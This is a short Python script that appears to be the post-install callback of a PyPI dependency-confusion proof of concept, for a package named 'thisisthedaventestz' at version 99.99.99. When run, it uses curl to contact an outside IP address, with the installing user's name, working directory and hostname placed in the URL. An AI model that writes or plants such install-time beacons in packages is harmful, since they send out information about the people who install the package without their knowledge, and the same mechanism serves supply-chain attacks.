import os
import subprocess

def test_callback():
    print("Running PyPI post-install test callback")
    subprocess.run(["curl", "-fsSL", "http://46.62.163.241:8585/deppoc?datacoming=pypi&package=thisisthedaventestz&version=99.99.99&user=$(whoami)&path=$(pwd)&hostname=$(hostname)"])

if __name__ == "__main__":
    test_callback()
